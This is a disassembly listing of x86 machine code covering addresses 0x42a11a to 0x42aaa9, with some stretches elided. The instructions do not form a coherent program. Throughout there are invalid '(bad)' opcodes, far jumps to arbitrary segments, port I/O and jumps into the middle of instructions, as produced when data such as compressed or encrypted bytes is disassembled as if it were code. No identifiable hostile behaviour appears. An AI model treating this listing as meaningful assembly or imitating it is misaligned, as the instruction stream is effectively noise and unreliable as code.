  42a11a:	or     al,0x67
  42a11c:	hlt    
  42a11d:	dec    ebp
  42a11e:	imul   edx,DWORD PTR [ebx],0xd0324cf3
  42a124:	pop    fs
  42a126:	das    
  42a127:	push   ecx
  42a128:	adc    ebp,DWORD PTR [edx-0x67673f56]
  42a12e:	shr    esp,0x91
  42a131:	xchg   BYTE PTR [edi],dh
  42a133:	mov    bh,BYTE PTR [edx-0x30dd7bf5]
  42a139:	jle    0x42a1ac
  42a13b:	or     al,0xff
  42a13d:	fld    TBYTE PTR [edx+0x40]
  42a140:	jg     0x42a0e4
  42a142:	retf   0xd61f
  42a145:	dec    esi
  42a146:	out    dx,al
  42a147:	stc    
  42a148:	add    al,0xba
  42a14a:	pop    edx
  42a14b:	inc    esi
  42a14c:	pushf  
  42a14d:	retf   
  42a14e:	jmp    0x209e:0xda3d6691
  42a155:	jmp    0x83c85345
  42a15a:	pop    ds
  42a15b:	pop    esi
  42a15c:	mov    esi,0xd9104e5a
  42a161:	jg     0x42a11b
  42a163:	xor    BYTE PTR [ecx+0x2],dl
  42a166:	jnp    0x42a13d
  42a168:	sub    ecx,esp
  42a16a:	in     eax,0x44
  42a16c:	aam    0xe3
  42a16e:	adc    ebp,DWORD PTR [esi]
  42a170:	dec    eax
  42a171:	inc    ebx
  42a172:	inc    edx
  42a173:	(bad)  [esi-0x5344e453]
  42a179:	mov    ds:0x6c8c7c9d,eax
  42a17e:	xchg   esi,eax
  42a17f:	jg     0x42a160
  42a181:	dec    ebx
  42a182:	sahf   
  42a183:	pop    ds
  42a184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a185:	mov    dh,0x8d
  42a187:	sub    esp,ebp
  42a189:	jae    0x42a133
  42a18b:	xchg   ebx,eax
  42a18c:	(bad)  
  42a18d:	adc    BYTE PTR [ebp+esi*1+0x30],bh
  42a191:	sub    BYTE PTR [esi],0xcc
  42a194:	shl    DWORD PTR [eax],0x60
  42a197:	xlat   BYTE PTR ds:[ebx]
  42a198:	loope  0x42a185
  42a19a:	ror    BYTE PTR ds:0x2d792ebc,0x2d
  42a1a1:	lods   al,BYTE PTR ds:[esi]
  42a1a2:	xchg   esp,eax
  42a1a3:	jmp    DWORD PTR [eax-0x4fd7779e]
  42a1a9:	stc    
  42a1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1ab:	pop    ebx
  42a1ac:	aad    0x1
  42a1ae:	(bad)  
  42a1af:	ins    DWORD PTR es:[edi],dx
  42a1b0:	not    bh
  42a1b2:	dec    ebx
  42a1b3:	mov    cl,0x4b
  42a1b5:	add    DWORD PTR [edx+0x66],ebp
  42a1b8:	pop    es
  42a1b9:	pop    esp
  42a1ba:	adc    eax,0xf5b8e73a
  42a1bf:	push   ss
  42a1c0:	adc    al,0xc7
  42a1c2:	test   ch,bl
  42a1c4:	mov    ds:0xa966c032,eax
  42a1c9:	mov    ebp,0x9cbecd82
  42a1ce:	mov    bl,ah
  42a1d0:	cwde   
  42a1d1:	xchg   esp,eax
  42a1d2:	xor    bl,BYTE PTR [ebp-0x43]
  42a1d5:	repnz ins DWORD PTR es:[edi],dx
  42a1d7:	mov    eax,0xbc636159
  42a1dc:	xor    DWORD PTR [ecx+ebp*4+0x42],0x2e
  42a1e1:	push   cs
  42a1e2:	xchg   ax,ax
  42a1e4:	cmp    bh,cl
  42a1e6:	cmp    ah,BYTE PTR [esi-0x3d544a46]
  42a1ec:	je     0x3fa9c15e
  42a1f2:	push   ds
  42a1f3:	scas   al,BYTE PTR es:[edi]
  42a1f4:	iret   
  42a1f5:	pop    ecx
  42a1f6:	imul   esp,DWORD PTR [esi],0x653bd90b
  42a1fc:	test   BYTE PTR [esi+0x56],cl
  42a1ff:	ins    BYTE PTR es:[edi],dx
  42a200:	in     eax,dx
  42a201:	sub    DWORD PTR [ecx-0x40],eax
  42a204:	mov    eax,ds:0x1a83d364
  42a209:	xchg   ebx,eax
  42a20a:	push   edx
  42a20b:	xor    eax,0xe775e367
  42a210:	inc    eax
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fxch   st(4)
  42a281:	rol    DWORD PTR [ebp-0x4c],1
  42a284:	jge    0x42a249
  42a286:	add    DWORD PTR [eax],eax
  42a288:	add    eax,0x86000001
  42a28d:	cdq    
  42a28e:	std    
  42a28f:	pop    esp
  42a290:	lods   al,BYTE PTR ds:[esi]
  42a291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a292:	call   0xd54a0a13
  42a297:	adc    DWORD PTR [esi-0x10],esp
  42a29a:	icebp  
  42a29b:	push   esi
  42a29c:	and    edx,DWORD PTR [ecx]
  42a29e:	dec    ebx
  42a29f:	mov    bh,al
  42a2a1:	xchg   esi,eax
  42a2a2:	jnp    0x42a288
  42a2a4:	inc    ecx
  42a2a5:	shr    ebx,cl
  42a2a7:	inc    bp
  42a2a9:	aam    0x8c
  42a2ab:	loopne 0x42a2c9
  42a2ad:	sub    cl,BYTE PTR [eax-0x63]
  42a2b0:	or     ebx,DWORD PTR [edi-0x462b6a5d]
  42a2b6:	test   BYTE PTR [eax-0x43],0x68
  42a2ba:	nop
  42a2bb:	push   ebp
  42a2bc:	neg    BYTE PTR [eax-0x35d85e81]
  42a2c2:	cmc    
  42a2c3:	mov    dh,BYTE PTR [edi]
  42a2c5:	sbb    al,ch
  42a2c7:	sub    al,0x9e
  42a2c9:	(bad)  
  42a2ca:	mov    ds:0x5202d782,al
  42a2cf:	inc    esp
  42a2d0:	pop    esp
  42a2d1:	or     al,0x1
  42a2d3:	sbb    DWORD PTR [esi-0x20],0xeb237458
  42a2da:	outs   dx,DWORD PTR ds:[esi]
  42a2db:	(bad)  
  42a2dd:	hlt    
  42a2de:	call   0x82be:0xeac8cbf6
  42a2e5:	jb     0x42a290
  42a2e7:	or     dh,cl
  42a2e9:	fstp   TBYTE PTR [eax+0x13b985d5]
  42a2ef:	push   es
  42a2f0:	and    al,0x8
  42a2f2:	mov    bh,0x18
  42a2f4:	mov    DWORD PTR [ebp+0x48],edi
  42a2f7:	leave  
  42a2f8:	push   ebp
  42a2f9:	or     al,0x6c
  42a2fb:	call   0x98fc:0x29f39214
  42a302:	arpl   WORD PTR [esi+edx*2-0x31],cx
  42a306:	(bad)  
  42a307:	stc    
  42a308:	xlat   BYTE PTR ds:[ebx]
  42a309:	mul    bl
  42a30b:	xchg   ecx,eax
  42a30c:	xor    al,0xe3
  42a30e:	mov    ds:0x6d08705,al
  42a313:	cdq    
  42a314:	sbb    BYTE PTR [ebx-0xae79640],cl
  42a31a:	arpl   WORD PTR ds:0x723032e4,sp
  42a320:	add    dl,al
  42a322:	cmp    BYTE PTR [ecx+0x37],0x32
  42a326:	rcr    dl,1
  42a328:	leave  
  42a329:	in     eax,0x5
  42a32b:	add    eax,0x6f24f6cc
  42a330:	in     eax,dx
  42a331:	and    ebx,esp
  42a333:	mov    esp,0xad84ce1
  42a338:	jp     0x42a390
  42a33a:	cs and eax,0x37cb74d1
  42a340:	mov    esp,0xe85d8f85
  42a345:	or     DWORD PTR [edi-0x1f],eax
  42a348:	add    BYTE PTR [ebp-0x44],0xfc
  42a34c:	loopne 0x42a3b4
  42a34e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a34f:	xchg   edx,eax
  42a350:	lahf   
  42a351:	movhlps xmm0,xmm5
  42a354:	in     eax,0xf9
  42a356:	in     al,0xb6
  42a358:	xor    dh,ch
  42a35a:	repz cli 
  42a35c:	push   cs
  42a35d:	dec    edi
  42a35e:	mov    eax,ds:0xcdfe82ef
  42a363:	dec    esp
  42a364:	mov    cl,0x3
  42a366:	outs   dx,DWORD PTR ds:[esi]
  42a367:	out    dx,al
  42a368:	mov    ebx,0x66303e80
  42a36d:	jl     0x42a367
  42a36f:	inc    ebp
  42a370:	(bad)  [edx-0x77ba6f86]
  42a376:	outs   dx,DWORD PTR ds:[esi]
  42a377:	adc    DWORD PTR [ebp+0x198b1b64],edi
  42a37d:	call   0x70df5213
  42a382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a383:	cmp    ebp,DWORD PTR [esi+0xb]
  42a386:	mov    ebp,fs
  42a388:	out    dx,al
  42a389:	jmp    0x157d:0x10d90da8
  42a390:	add    DWORD PTR [eax],0x0
	...
  42a3f2:	add    BYTE PTR [eax],al
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x3cea9e3d
  42a403:	and    BYTE PTR [edx+0x50001c4],al
  42a409:	add    DWORD PTR [eax],eax
  42a40b:	add    cl,ah
  42a40d:	or     DWORD PTR [eax+0x2943cb66],edi
  42a413:	mov    ebp,0x275062ac
  42a418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a419:	loop   0x42a39d
  42a41b:	and    DWORD PTR [ebx],ebp
  42a41d:	loopne 0x42a439
  42a41f:	les    ebp,FWORD PTR [esi]
  42a421:	cmp    esi,ebx
  42a423:	test   al,0xfa
  42a425:	sub    al,0xb6
  42a427:	cmp    eax,0x2f3e81d2
  42a42c:	sbb    DWORD PTR [ebx-0x5e824865],ebx
  42a432:	mov    ebp,0x9a188169
  42a437:	shl    BYTE PTR gs:[ebp-0x537984f3],cl
  42a43e:	rcr    BYTE PTR [edi],1
  42a440:	mov    ecx,0xcff9b7d1
  42a445:	push   ds
  42a446:	ss cli 
  42a448:	inc    esp
  42a449:	ja     0x42a40d
  42a44b:	mov    edx,0x85bfffdc
  42a450:	dec    ebp
  42a451:	psubw  mm5,QWORD PTR [eax]
  42a454:	loop   0x42a43b
  42a456:	bound  eax,QWORD PTR [ebx-0x4a97404d]
  42a45c:	mov    al,0x7f
  42a45e:	popw   ds
  42a460:	and    al,0xf6
  42a462:	dec    edx
  42a463:	pop    es
  42a464:	lds    eax,FWORD PTR [ebp-0x4]
  42a467:	mov    dl,0x7a
  42a469:	ins    BYTE PTR es:[edi],dx
  42a46a:	into   
  42a46b:	je     0x42a476
  42a46d:	xchg   esp,eax
  42a46e:	mov    edi,0x896f25d2
  42a473:	cwde   
  42a474:	jmp    0x9c03e7bd
  42a479:	out    dx,al
  42a47a:	aaa    
  42a47b:	jb     0x42a421
  42a47d:	call   0x6324e81c
  42a482:	int3   
  42a483:	ret    0xa548
  42a486:	lds    ebx,FWORD PTR [edi-0x15]
  42a489:	inc    edx
  42a48a:	popf   
  42a48b:	sbb    edx,DWORD PTR [ebp-0x38e9ea6]
  42a491:	adc    ch,BYTE PTR [ecx+0x376c827]
  42a497:	lods   al,BYTE PTR ds:[esi]
  42a498:	scas   eax,DWORD PTR es:[edi]
  42a499:	mov    bh,0xfa
  42a49b:	sbb    esi,DWORD PTR [ebx+0x3]
  42a49e:	sti    
  42a49f:	push   ds
  42a4a0:	mov    bl,0xdd
  42a4a2:	adc    esi,DWORD PTR ds:0x81b1fa64
  42a4a8:	mov    bl,0xed
  42a4aa:	cmp    DWORD PTR [ebp-0xa],esi
  42a4ad:	ins    BYTE PTR es:[edi],dx
  42a4ae:	xor    edx,DWORD PTR [edx-0x2917c26e]
  42a4b4:	fwait
  42a4b5:	push   0xffffffa2
  42a4b7:	jbe    0x42a4b0
  42a4b9:	mov    dh,0x39
  42a4bb:	repnz mov bh,0xc8
  42a4be:	add    dh,BYTE PTR [esp]
  42a4c1:	push   eax
  42a4c2:	or     edx,DWORD PTR [esi-0x1b3c4066]
  42a4c8:	or     ebx,ecx
  42a4ca:	xchg   BYTE PTR [ebx-0x56b4ea47],cl
  42a4d0:	cmc    
  42a4d1:	mov    eax,ds:0xdeabe236
  42a4d6:	ret    
  42a4d7:	jo     0x42a4c0
  42a4d9:	int    0xd3
  42a4db:	cdq    
  42a4dc:	clc    
  42a4dd:	xlat   BYTE PTR ds:[ebx]
  42a4de:	aad    0x82
  42a4e0:	push   0x4e
  42a4e2:	pop    esp
  42a4e3:	lock xor esp,DWORD PTR ds:0x7f980977
  42a4ea:	pop    ss
  42a4eb:	cli    
  42a4ec:	cmp    ebx,esp
  42a4ee:	outs   dx,BYTE PTR ds:[esi]
  42a4ef:	lahf   
  42a4f0:	mov    ebp,0x88ef548b
  42a4f5:	mov    BYTE PTR [ebx-0x75],cl
  42a4f8:	popa   
  42a4f9:	push   ebp
  42a4fa:	cs (bad) 
  42a4fc:	fist   DWORD PTR [edi]
  42a4fe:	sub    DWORD PTR [edi+edx*2],0xffffffe9
  42a502:	jle    0x42a54a
  42a504:	inc    ebx
  42a505:	scas   eax,DWORD PTR es:[edi]
  42a506:	adc    BYTE PTR [esi-0x25f0dcef],dh
  42a50c:	mov    edi,0x5405122
	...
  42a571:	add    BYTE PTR [eax],al
  42a573:	add    BYTE PTR [eax],bl
  42a575:	dec    edi
  42a576:	pop    ss
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x24a4949f
  42a583:	stos   BYTE PTR es:[edi],al
  42a584:	xchg   ebp,eax
  42a586:	add    DWORD PTR [eax],eax
  42a588:	add    eax,0xae000001
  42a58d:	inc    edi
  42a58e:	xchg   edx,eax
  42a58f:	retf   
  42a590:	mov    DWORD PTR [esi],ebx
  42a592:	xchg   DWORD PTR [edx],edi
  42a594:	out    dx,eax
  42a595:	rol    esi,0xf0
  42a598:	add    ebx,DWORD PTR [esp+edi*4+0x587668b]
  42a59f:	or     al,0xec
  42a5a1:	pop    eax
  42a5a2:	mov    eax,ds:0x258a54cc
  42a5a7:	rcr    DWORD PTR [ebp-0x74],cl
  42a5aa:	push   0x2358dc40
  42a5af:	call   0x72643c44
  42a5b4:	fcom   QWORD PTR [edx]
  42a5b6:	fmul   QWORD PTR [edi-0x15]
  42a5b9:	pop    ecx
  42a5ba:	fimul  DWORD PTR [edx+edi*1-0x25]
  42a5be:	outs   dx,BYTE PTR ds:[esi]
  42a5bf:	xlat   BYTE PTR ds:[ebx]
  42a5c0:	mov    al,ds:0xc708670
  42a5c5:	pop    edi
  42a5c6:	jb     0x42a569
  42a5c8:	lea    edi,[eax*2-0x4dc66f45]
  42a5cf:	xor    edx,eax
  42a5d1:	push   ebp
  42a5d2:	stos   BYTE PTR es:[edi],al
  42a5d3:	xor    eax,0x60063aa4
  42a5d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a5d9:	mov    ebp,esi
  42a5db:	fld    QWORD PTR [edx+eax*8+0x33]
  42a5df:	addr16 retf 0x2d61
  42a5e3:	inc    ebx
  42a5e4:	std    
  42a5e5:	push   esi
  42a5e6:	sbb    BYTE PTR [esi+0x38],cl
  42a5e9:	fisubr DWORD PTR ss:[edi]
  42a5ec:	scas   al,BYTE PTR es:[edi]
  42a5ed:	jmp    0xc201f40
  42a5f2:	push   edi
  42a5f3:	rol    edi,1
  42a5f5:	arpl   WORD PTR [ebx+esi*2],bx
  42a5f8:	cld    
  42a5f9:	dec    edx
  42a5fa:	pop    edi
  42a5fb:	mov    dl,0xd6
  42a5fd:	(bad)  
  42a5fe:	mov    eax,es
  42a600:	ror    DWORD PTR [eax-0x53f0fada],0xa
  42a607:	out    0x23,al
  42a609:	fbld   TBYTE PTR [eax+0xa05300e]
  42a60f:	jmp    0xd6022668
  42a614:	popf   
  42a615:	jnp    0x42a5b3
  42a617:	xchg   edx,eax
  42a618:	inc    edi
  42a619:	or     eax,0xf48dfde7
  42a61e:	jl     0x42a5e8
  42a620:	or     eax,0xea321e5f
  42a625:	pushf  
  42a626:	push   ss
  42a627:	int    0xe7
  42a629:	repnz loopne 0x42a5b5
  42a62c:	xchg   ecx,eax
  42a62d:	pusha  
  42a62e:	sar    BYTE PTR ds:0x6b835f1a,cl
  42a634:	pop    ebx
  42a635:	shl    BYTE PTR [bp+di-0x7d],0xf0
  42a63a:	mov    al,BYTE PTR [ebx+0xb]
  42a63d:	and    al,BYTE PTR [ebp+0x6ab9b3e4]
  42a643:	lock retf 0x9645
  42a647:	outs   dx,BYTE PTR ds:[esi]
  42a648:	and    al,0x47
  42a64a:	xor    ah,bl
  42a64c:	pop    ebp
  42a64d:	inc    ebx
  42a64e:	jmp    0x42a65b
  42a650:	sub    esp,DWORD PTR [edi-0x52d61e41]
  42a656:	mov    al,ds:0x1722c313
  42a65b:	in     eax,0xe9
  42a65d:	not    DWORD PTR [edx-0x67]
  42a660:	dec    ebp
  42a661:	ds loop 0x42a631
  42a664:	stc    
  42a665:	shr    al,cl
  42a667:	iret   
  42a668:	and    ebp,DWORD PTR [edi+0x7e248d16]
  42a66e:	cmp    esp,ebx
  42a670:	sub    esi,eax
  42a672:	sub    ebx,DWORD PTR [esp+ebp*1+0x1f]
  42a676:	inc    edx
  42a677:	xchg   BYTE PTR [ebx],bh
  42a679:	add    DWORD PTR [edi],ecx
  42a67b:	cmp    DWORD PTR [ebx+edx*4],ebx
  42a67e:	sub    al,0x37
  42a680:	stc    
  42a681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a682:	xchg   ebx,eax
  42a683:	inc    DWORD PTR ds:0x7fcdd5a7
  42a689:	xchg   edx,eax
  42a68a:	push   cs
  42a68b:	pop    edx
  42a68c:	dec    eax
  42a68d:	sub    BYTE PTR [ecx+eax*8+0x49],al
	...
  42a6f4:	and    al,0x16
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x6247ece4],0x8cfb4ab8
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0x3d000001
  42a70d:	xor    DWORD PTR [edi-0x347249f8],eax
  42a713:	test   BYTE PTR [edi+eax*4-0x39c73180],0x5
  42a71b:	push   esi
  42a71c:	stos   BYTE PTR es:[edi],al
  42a71d:	mov    edi,0xe01cea14
  42a722:	mov    ds:0xe020f7a,al
  42a727:	xchg   BYTE PTR [esp+ecx*4-0x41f26e7d],dh
  42a72e:	pop    edx
  42a72f:	dec    ecx
  42a730:	add    DWORD PTR [ecx+edx*1+0x5573cff7],ebp
  42a737:	fld    QWORD PTR [eax]
  42a739:	je     0x42a729
  42a73b:	call   0x774c:0xd7dfcfe4
  42a742:	in     al,dx
  42a743:	in     eax,dx
  42a744:	aam    0xb7
  42a746:	push   es
  42a747:	xlat   BYTE PTR ds:[ebx]
  42a748:	inc    esi
  42a749:	mov    ebx,0x76f51198
  42a74e:	mov    ebx,0xe42f7fd5
  42a753:	push   esi
  42a754:	sub    al,0x20
  42a756:	pop    ecx
  42a757:	stc    
  42a758:	and    al,0x1f
  42a75a:	sub    DWORD PTR [ecx+0x38],edx
  42a75d:	mov    edi,esp
  42a75f:	push   cs
  42a760:	fistp  QWORD PTR [ebx]
  42a762:	sub    BYTE PTR [edx+0xd3fe218],bh
  42a768:	ins    BYTE PTR es:[edi],dx
  42a769:	setl   bh
  42a76c:	std    
  42a76d:	pop    ebx
  42a76e:	push   cs
  42a76f:	xchg   edx,eax
  42a770:	mov    bl,0xd4
  42a772:	ss out dx,al
  42a774:	mov    ebp,0x27d24d5c
  42a779:	cmp    al,0xca
  42a77b:	fcmovne st,st(5)
  42a77d:	daa    
  42a77e:	pusha  
  42a77f:	cmp    eax,0x74ef315b
  42a784:	push   0xbc166510
  42a789:	dec    eax
  42a78a:	xchg   ecx,eax
  42a78b:	les    edi,FWORD PTR [edx+ebx*1]
  42a78e:	(bad)  
  42a78f:	cmp    al,0xdd
  42a791:	jge    0x42a7f7
  42a793:	mov    ebx,0x3d410f20
  42a798:	test   eax,0x265399b0
  42a79d:	mov    ebx,0xa2ba1842
  42a7a2:	lods   eax,DWORD PTR ds:[esi]
  42a7a3:	jno    0x42a80a
  42a7a5:	adc    BYTE PTR ds:0x3085a070,dl
  42a7ab:	cmp    BYTE PTR [ebp+0x3a],ah
  42a7ae:	lods   al,BYTE PTR ds:[esi]
  42a7af:	dec    ecx
  42a7b0:	(bad)  
  42a7b1:	or     bl,BYTE PTR [esi]
  42a7b3:	jb     0x42a807
  42a7b5:	popf   
  42a7b6:	loope  0x42a77b
  42a7b8:	cmp    ebp,DWORD PTR [edx+0x5747e18]
  42a7be:	cld    
  42a7bf:	popa   
  42a7c0:	mov    eax,0x102a4ae8
  42a7c5:	inc    esp
  42a7c6:	inc    esi
  42a7c7:	and    BYTE PTR [edx-0x42078a75],bh
  42a7cd:	int3   
  42a7ce:	in     eax,0x9
  42a7d0:	inc    esp
  42a7d1:	imul   edx,DWORD PTR ds:0xe6fe71b,0x8cbfc137
  42a7db:	add    BYTE PTR [edi-0x39b32291],0x37
  42a7e2:	or     edx,ebx
  42a7e4:	out    dx,eax
  42a7e5:	dec    edx
  42a7e6:	(bad)  
  42a7e7:	aaa    
  42a7e8:	(bad)  
  42a7e9:	pusha  
  42a7ea:	sub    dh,BYTE PTR [ebx-0x30]
  42a7ed:	adc    eax,0x64281fa6
  42a7f2:	in     eax,dx
  42a7f3:	data16 add BYTE PTR [ebx],0x9c
  42a7f7:	inc    ebp
  42a7f8:	cld    
  42a7f9:	pop    ss
  42a7fa:	cmp    eax,DWORD PTR [ebp-0x265a4759]
  42a800:	mov    edx,0x99dcb922
  42a805:	xlat   BYTE PTR ds:[ebx]
  42a806:	sar    DWORD PTR [esi+0x13111c7b],0x84
  42a80d:	into   
  42a80e:	out    0x5e,al
  42a810:	xchg   esi,eax
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	fcom   DWORD PTR [ebp-0x386ea7c9]
  42a886:	add    DWORD PTR [eax],eax
  42a888:	add    eax,0xe9000001
  42a88d:	mov    ecx,0x59cbd144
  42a892:	jge    0x42a8f2
  42a894:	fucomip st,st(0)
  42a896:	mov    cl,ah
  42a898:	jg     0x42a8ed
  42a89a:	xchg   ecx,eax
  42a89b:	xchg   esp,eax
  42a89c:	in     eax,0x8
  42a89e:	push   edx
  42a89f:	push   es
  42a8a0:	and    BYTE PTR ds:0xff154394,0x10
  42a8a7:	sub    DWORD PTR [eax],esp
  42a8a9:	test   esp,ecx
  42a8ab:	shl    BYTE PTR [esi-0x32],1
  42a8ae:	outs   dx,DWORD PTR ds:[esi]
  42a8af:	jl     0x42a85b
  42a8b1:	mov    WORD PTR [edx],fs
  42a8b3:	xchg   esp,eax
  42a8b4:	xchg   ebx,eax
  42a8b5:	push   edx
  42a8b6:	hlt    
  42a8b7:	push   eax
  42a8b8:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42a8ba:	retf   0x9f49
  42a8bd:	sub    ebp,DWORD PTR [esi-0x21]
  42a8c0:	pop    ecx
  42a8c1:	nop
  42a8c2:	xchg   esp,eax
  42a8c3:	xor    bl,BYTE PTR ds:0x625e82fa
  42a8c9:	lods   al,BYTE PTR ds:[esi]
  42a8ca:	hlt    
  42a8cb:	imul   ecx,DWORD PTR [eax],0xffffffc6
  42a8ce:	xchg   BYTE PTR [esi+edx*4],bh
  42a8d1:	ficom  DWORD PTR [ecx-0x22f4e05a]
  42a8d7:	gs xor bh,bh
  42a8da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a8db:	pop    ds
  42a8dc:	daa    
  42a8dd:	xchg   ebp,eax
  42a8de:	not    DWORD PTR [ecx-0x46a1decc]
  42a8e4:	jmp    0x2f739f94
  42a8e9:	mov    dl,0xfa
  42a8eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a8ec:	jp     0x42a92d
  42a8ee:	sub    eax,0x1bdc743a
  42a8f3:	cmp    BYTE PTR [edi+0x3e],al
  42a8f6:	sub    eax,0x876c4d65
  42a8fb:	sub    dl,BYTE PTR [ebp+0x22019f38]
  42a901:	xchg   ebp,eax
  42a902:	mov    edi,0x454e1cba
  42a907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a908:	std    
  42a909:	repz adc DWORD PTR [ecx],esp
  42a90c:	pop    eax
  42a90d:	adc    esi,DWORD PTR [edx]
  42a90f:	shl    dl,0x27
  42a912:	mov    ds:0x9cb16219,eax
  42a917:	mov    ecx,0x322430e1
  42a91c:	mov    fs,ebx
  42a91e:	cmp    al,BYTE PTR [eax]
  42a920:	xor    eax,0x5cd3b3ff
  42a925:	dec    edi
  42a926:	sub    al,0x7f
  42a928:	pop    ss
  42a929:	xor    al,BYTE PTR [ebx+0x7a6fbe64]
  42a92f:	jp     0x42a9ab
  42a931:	xor    esp,DWORD PTR [edi]
  42a933:	jl     0x42a8d5
  42a935:	(bad)  
  42a936:	pop    ebx
  42a937:	mov    ecx,0x81d7fbc2
  42a93c:	mov    dh,0x69
  42a93e:	sub    BYTE PTR [edi],bl
  42a940:	jmp    0x42a941
  42a942:	enter  0x45db,0x53
  42a946:	(bad)  
  42a947:	leave  
  42a948:	or     cl,BYTE PTR [esi-0x58258ad9]
  42a94e:	lea    ebp,[edx+ebp*4+0x5de6a62e]
  42a955:	mov    al,0xd7
  42a957:	inc    eax
  42a958:	jae    0x42a9c3
  42a95a:	mov    edi,0xf76705e3
  42a95f:	xchg   esi,eax
  42a960:	neg    BYTE PTR [edx-0x15]
  42a963:	stc    
  42a964:	test   al,0xeb
  42a966:	jns    0x42a9bf
  42a968:	cmp    dl,BYTE PTR [ecx]
  42a96a:	xor    DWORD PTR [esi+0x24f84879],edx
  42a970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a971:	sub    DWORD PTR [esi-0x36],ebx
  42a974:	lds    esi,FWORD PTR [ebp+0x2a]
  42a977:	popa   
  42a978:	mov    cl,0xa6
  42a97a:	popa   
  42a97b:	ds popa 
  42a97d:	lock sub dh,BYTE PTR [ebp+0x76]
  42a981:	add    edx,DWORD PTR [eax+0x28c7a5e8]
  42a987:	ins    DWORD PTR es:[edi],dx
  42a988:	outs   dx,DWORD PTR ds:[esi]
  42a989:	xor    ebx,DWORD PTR [eax]
  42a98b:	dec    BYTE PTR [eax-0x4a507c8e]
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	pop    es
  42aa01:	pop    ds
  42aa02:	xchg   esp,eax
  42aa03:	in     al,dx
  42aa04:	xchg   esi,eax
  42aa05:	enter  0x1,0x5
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    BYTE PTR [ecx-0x32],bh
  42aa0e:	in     eax,0xe7
  42aa10:	xor    BYTE PTR [ebx],ch
  42aa12:	stos   BYTE PTR es:[edi],al
  42aa13:	pop    esp
  42aa14:	je     0x42aa74
  42aa16:	push   cs
  42aa17:	cdq    
  42aa18:	ficomp WORD PTR [eax]
  42aa1a:	xlat   BYTE PTR ds:[ebx]
  42aa1b:	add    edi,DWORD PTR [ebx]
  42aa1d:	stc    
  42aa1e:	rcl    dl,1
  42aa20:	das    
  42aa21:	sub    dh,BYTE PTR [ebx]
  42aa23:	sar    BYTE PTR [eax],cl
  42aa25:	mov    ebp,0x12ff0d57
  42aa2a:	cmp    eax,0x1214d859
  42aa2f:	fcmovnbe st,st(3)
  42aa31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa32:	addr16 and dh,0xc7
  42aa36:	retf   
  42aa37:	pusha  
  42aa38:	mov    ah,0x7f
  42aa3a:	jp     0x42aa7b
  42aa3c:	sub    DWORD PTR [ebp-0x1b],eax
  42aa3f:	test   bh,dh
  42aa41:	dec    eax
  42aa42:	out    0x9a,eax
  42aa44:	mov    WORD PTR [edx-0x73586cf3],?
  42aa4a:	pop    esp
  42aa4c:	scas   eax,DWORD PTR es:[edi]
  42aa4d:	jge    0x42aa0d
  42aa4f:	mov    ebx,0xc92f0499
  42aa54:	mov    DWORD PTR [ecx+edx*1],esp
  42aa57:	shr    DWORD PTR [ecx],cl
  42aa59:	and    eax,0x8a4ef5d7
  42aa5e:	dec    edi
  42aa5f:	or     esi,DWORD PTR [esi+0x19a68b96]
  42aa65:	jmp    0x42aa05
  42aa67:	popa   
  42aa68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa69:	icebp  
  42aa6a:	js     0x42aa0c
  42aa6c:	shr    DWORD PTR [ecx],cl
  42aa6e:	xor    BYTE PTR [ecx+eax*8-0x9e053d2],bl
  42aa75:	mov    eax,ds:0x9ca51808
  42aa7a:	in     al,dx
  42aa7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa7c:	ins    DWORD PTR es:[edi],dx
  42aa7d:	mov    esi,0x28801f
  42aa82:	or     al,0xe7
  42aa84:	ja     0x42aacc
  42aa86:	xchg   DWORD PTR [ebp+ecx*1+0x6feb97bb],esp
  42aa8d:	inc    esi
  42aa8e:	pop    esp
  42aa8f:	cwde   
  42aa90:	or     al,0xc3
  42aa92:	mov    bh,0xa7
  42aa94:	sub    ch,BYTE PTR [edi+0x34a2170a]
  42aa9a:	in     eax,dx
  42aa9b:	inc    edx
  42aa9c:	fisubr DWORD PTR [ebx+0x6303beeb]
  42aaa2:	mov    ebx,0x9cc78111
  42aaa7:	cmp    al,0x63
  42aaa9:	fs stos BYTE PTR es:[edi],al
